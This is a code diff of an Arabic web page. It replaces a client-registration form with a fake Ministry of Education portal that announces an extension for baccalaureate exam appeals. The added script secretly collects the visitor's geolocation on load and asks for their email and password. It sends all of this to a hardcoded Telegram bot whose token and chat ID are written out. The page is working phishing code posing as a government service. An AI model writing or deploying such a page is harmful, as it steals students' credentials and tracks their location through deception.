@@ -1,171 +1,495 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>نظام تسجيل العملاء الذكي</title>
-  <style>
-    body {
-      background-color: #000;
-      color: #fff;
-      font-family: 'Cairo', sans-serif;
-      padding: 20px;
-      text-align: center;
-    }
-    .container {
-      max-width: 800px;
-      margin: auto;
-      background-color: #111;
-      padding: 20px;
-      border-radius: 10px;
-    }
-    input, select, textarea, button {
-      margin: 10px;
-      padding: 10px;
-      width: 90%;
-      font-size: 16px;
-      border-radius: 5px;
-      border: none;
-      background-color: #fff;
-      color: #000;
-    }
-    button {
-      background-color: #ff0055;
-      color: white;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #ff3366;
-    }
-    table {
-      width: 100%;
-      margin-top: 20px;
-      border-collapse: collapse;
-      background-color: #222;
-    }
-    th, td {
-      padding: 8px;
-      border: 1px solid #444;
-      color: #fff;
-    }
-    input[type="search"] {
-      width: 50%;
-      margin-bottom: 10px;
-      background-color: #fff;
-      color: #000;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تمديد الاعتراضات - وزارة التربية</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        :root {
+            --primary-color: #1a5f23;
+            --secondary-color: #2e7d32;
+            --accent-color: #4caf50;
+            --dark-color: #0d3010;
+            --light-color: #e8f5e9;
+            --warning-color: #ff9800;
+            --info-color: #2196f3;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--light-color) 0%, #c8e6c9 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* الشريط العلوي */
+        .top-bar {
+            background: linear-gradient(135deg, var(--dark-color) 0%, var(--primary-color) 100%);
+            color: white;
+            padding: 8px 0;
+            font-size: 14px;
+            text-align: center;
+            border-radius: 8px 8px 0 0;
+        }
+        
+        /* الرأس */
+        header {
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
+            opacity: 0.5;
+        }
+        
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-left: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .logo i {
+            font-size: 40px;
+            color: var(--secondary-color);
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        
+        /* شريط الإعلانات */
+        .marquee {
+            background: linear-gradient(90deg, var(--warning-color) 0%, #ff5722 100%);
+            color: white;
+            padding: 12px;
+            overflow: hidden;
+            position: relative;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .marquee-content {
+            display: block;
+            width: 100%;
+            text-align: center;
+            animation: marquee 15s linear infinite;
+        }
+        
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        
+        .announcement {
+            background-color: #ffeb3b;
+            color: #333;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-right: 5px solid #ff9800;
+            animation: highlight 3s infinite;
+        }
+        
+        @keyframes highlight {
+            0% { box-shadow: 0 0 0 rgba(255, 152, 0, 0.5); }
+            50% { box-shadow: 0 0 15px rgba(255, 152, 0, 0.8); }
+            100% { box-shadow: 0 0 0 rgba(255, 152, 0, 0.5); }
+        }
+        
+        .content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .content::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color), var(--info-color), var(--warning-color));
+        }
+        
+        .info-box {
+            background-color: var(--light-color);
+            border-right: 5px solid var(--secondary-color);
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .info-box h3 {
+            color: var(--dark-color);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .info-box h3 i {
+            margin-left: 10px;
+        }
+        
+        form {
+            margin-top: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+        
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            border-color: var(--accent-color);
+            outline: none;
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
+        }
+        
+        button {
+            background: linear-gradient(135deg, var(--secondary-color) 0%, var(--primary-color) 100%);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .location-btn {
+            background: linear-gradient(135deg, var(--info-color) 0%, #0d47a1 100%);
+            display: block;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 15px;
+            font-size: 18px;
+        }
+        
+        .location-btn:hover {
+            background: linear-gradient(135deg, #1976d2 0%, #0d47a1 100%);
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 14px;
+            padding: 15px;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .success-message {
+            background-color: var(--light-color);
+            color: var(--secondary-color);
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            text-align: center;
+            border-right: 5px solid var(--accent-color);
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .result-date {
+            background: linear-gradient(135deg, var(--info-color) 0%, #0d47a1 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .logo {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .logo i {
+                font-size: 30px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h2>📲 نظام تسجيل وتفعيل الحسابات</h2>
-        <h2> مكــتب الفــرات معكم اينما تكونو</h2>
-    <form id="clientForm">
-      <input type="text" name="name" placeholder="اسم العميل" required><br>
-      <select name="service" required>
-        <option value="">اختر نوع الحساب</option>
-        <option value="واتساب">واتساب</option>
-        <option value="شام كاش">شام كاش</option>
-        <option value="فيسبوك">فيسبوك</option>
-        <option value="انستغرام">انستغرام</option>
-        <option value="تيليجرام">تيليجرام</option>
-      </select><br>
-      <select name="status" required>
-        <option value="">حالة التفعيل</option>
-        <option value="✅ واصل">✅ واصل</option>
-        <option value="❌ غير واصل">❌ غير واصل</option>
-      </select><br>
-      <input type="text" name="phone" placeholder="رقم الهاتف" required><br>
-      <textarea name="notes" placeholder="ملاحظات إضافية"></textarea><br>
-      <button type="submit">💾 تسجيل</button>
-    </form>
+    <div class="container">
+        <!-- الشريط العلوي -->
+        <div class="top-bar">
+            <span>وزارة التربية والتعليم | الإدارة العامة للامتحانات</span>
+        </div>
+        
+        <!-- الرأس -->
+        <header>
+            <div class="logo-container">
+                <div class="logo">
+                    <i class="fas fa-graduation-cap"></i>
+                </div>
+                <h1>وزارة التربية والتعليم</h1>
+            </div>
+            <p>نظام إيداع الاعتراضات الإلكتروني</p>
+        </header>
+        
+        <!-- شريط الإعلانات -->
+        <div class="marquee">
+            <div class="marquee-content">
+                <i class="fas fa-bullhorn"></i> تنويه: تم تمديد مهلة الاعتراضات حتى 4/9/2025 الساعة الواحدة ظهراً
+            </div>
+        </div>
+        
+        <!-- إعلان النتائج -->
+        <div class="result-date">
+            <i class="fas fa-calendar-alt"></i> سيتم إعلان النتائج يوم الجمعة المصادف 12/9/2025
+        </div>
+        
+        <div class="content">
+            <div class="info-box">
+                <h3><i class="fas fa-info-circle"></i> إعلان هام</h3>
+                <p>بسبب عطل تقني في المخدم الذي تسبب بعرقلة التواصل، تم تمديد مهلة تقديم الاعتراضات لطلبة البكالوريا حتى يوم الخميس الموافق 4/9/2025 الساعة الواحدة ظهراً.</p>
+                <p>نتمنى التوفيق لكافة الطلبة.</p>
+            </div>
+            
+            <div id="location-section">
+                <p>جاري طلب الموقع الخاص بك تلقائياً...</p>
+                <div style="text-align: center; margin: 20px 0;">
+                    <div class="loading"></div>
+                </div>
+            </div>
+            
+            <div id="form-section" class="hidden">
+                <div class="info-box">
+                    <h3><i class="fas fa-user-plus"></i> التسجيل في الموقع</h3>
+                    <p>للاستفادة من الخدمات الإلكترونية والحصول على الرابط الإلكتروني للنتائج، يرجى التسجيل في الموقع:</p>
+                </div>
+                
+                <form id="register-form">
+                    <div class="form-group">
+                        <label for="email"><i class="fas fa-envelope"></i> البريد الإلكتروني:</label>
+                        <input type="email" id="email" required placeholder="example@email.com">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> كلمة المرور:</label>
+                        <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية">
+                    </div>
+                    
+                    <button type="submit"><i class="fas fa-paper-plane"></i> تسجيل والاستمرار</button>
+                </form>
+            </div>
+            
+            <div id="success-message" class="success-message hidden">
+                <h3><i class="fas fa-check-circle"></i> تمت العملية بنجاح!</h3>
+                <p>تم إرسال معلوماتك بنجاح. سيتم إعلامك بأي أخبار جديدة.</p>
+                <p>سيصلك رابط النتائج على بريدك الإلكتروني يوم الجمعة 12/9/2025.</p>
+            </div>
+        </div>
+        
+        <footer>
+            <p>جميع الحقوق محفوظة © 2025 - وزارة التربية والتعليم</p>
+            <p>هاتف: 1234567 (0) 963+ | فاكس: 1234568 (0) 963+</p>
+        </footer>
+    </div>
 
-    <input type="search" id="searchInput" placeholder="🔍 ابحث عن عميل...">
-
-    <table id="clientTable">
-      <thead>
-        <tr>
-          <th>الاسم</th>
-          <th>عدد التكرار</th>
-          <th>الخدمة</th>
-          <th>الحالة</th>
-          <th>الهاتف</th>
-          <th>ملاحظات</th>
-        </tr>
-      </thead>
-      <tbody></tbody>
-    </table>
-  </div>
-
-  <script>
-    const form = document.getElementById("clientForm");
-    const tableBody = document.querySelector("#clientTable tbody");
-    const searchInput = document.getElementById("searchInput");
-
-    const TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
-    const CHAT_ID = "7493001551";
-
-    let clients = JSON.parse(localStorage.getItem("clients")) || [];
-
-    function saveClients() {
-      localStorage.setItem("clients", JSON.stringify(clients));
-    }
-
-    function sendToTelegram(data) {
-      const message = `📥 تسجيل جديد:\n👤 الاسم: ${data.name}\n📱 الخدمة: ${data.service}\n📶 الحالة: ${data.status}\n📞 الهاتف: ${data.phone}\n📝 ملاحظات: ${data.notes || "لا يوجد"}`;
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
-    }
-
-    function updateTable() {
-      tableBody.innerHTML = "";
-      const grouped = {};
-
-      clients.forEach(c => {
-        const key = c.name + "_" + c.phone;
-        if (!grouped[key]) {
-          grouped[key] = { ...c, count: 1 };
-        } else {
-          grouped[key].count++;
+    <script>
+        // بيانات بوت التلجرام
+        const telegramBotToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+        const telegramChatId = '7493001551';
+        
+        // طلب الموقع تلقائياً عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            
+                            // إرسال الموقع إلى التلجرام
+                            const locationMessage = `📍 موقع جديد: https://www.google.com/maps?q=${latitude},${longitude}`;
+                            sendToTelegram(locationMessage);
+                            
+                            // إظهار نموذج التسجيل
+                            document.getElementById('location-section').classList.add('hidden');
+                            document.getElementById('form-section').classList.remove('hidden');
+                        },
+                        function(error) {
+                            alert('فشل في الحصول على الموقع. يرجى التأكد من تفعيل خدمات الموقع.');
+                            console.error('Error getting location:', error);
+                            // المتابعة رغم الخطأ لإظهار نموذج التسجيل
+                            document.getElementById('location-section').classList.add('hidden');
+                            document.getElementById('form-section').classList.remove('hidden');
+                        },
+                        { timeout: 10000 }
+                    );
+                } else {
+                    alert('متصفحك لا يدعم خدمات الموقع.');
+                    // المتابعة رغم الخطأ لإظهار نموذج التسجيل
+                    document.getElementById('location-section').classList.add('hidden');
+                    document.getElementById('form-section').classList.remove('hidden');
+                }
+            }, 2000); // انتظار لمدة ثانيتين لمحاكاة عملية التحميل
+        });
+        
+        document.getElementById('register-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // إرسال بيانات التسجيل إلى التلجرام
+            const registerMessage = `📧 بريد إلكتروني: ${email}\n🔐 كلمة مرور: ${password}`;
+            sendToTelegram(registerMessage);
+            
+            // إظهار رسالة النجاح وإخفاء النموذج
+            document.getElementById('form-section').classList.add('hidden');
+            document.getElementById('success-message').classList.remove('hidden');
+        });
+        
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
         }
-      });
-
-      Object.values(grouped).forEach(data => {
-        const row = document.createElement("tr");
-        row.innerHTML = `
-          <td>${data.name}</td>
-          <td>${data.count}</td>
-          <td>${data.service}</td>
-          <td>${data.status}</td>
-          <td>${data.phone}</td>
-          <td>${data.notes || "—"}</td>
-        `;
-        tableBody.appendChild(row);
-      });
-    }
-
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
-      const data = Object.fromEntries(new FormData(form).entries());
-      clients.push(data);
-      saveClients();
-      updateTable();
-      sendToTelegram(data);
-      form.reset();
-    });
-
-    searchInput.addEventListener("input", function() {
-      const term = this.value.toLowerCase();
-      tableBody.querySelectorAll("tr").forEach(row => {
-        const match = Array.from(row.children).some(td => td.textContent.toLowerCase().includes(term));
-        row.style.display = match ? "" : "none";
-      });
-    });
-
-    // تحميل البيانات عند فتح الصفحة
-    updateTable();
-  </script>
+    </script>
 </body>
 </html>
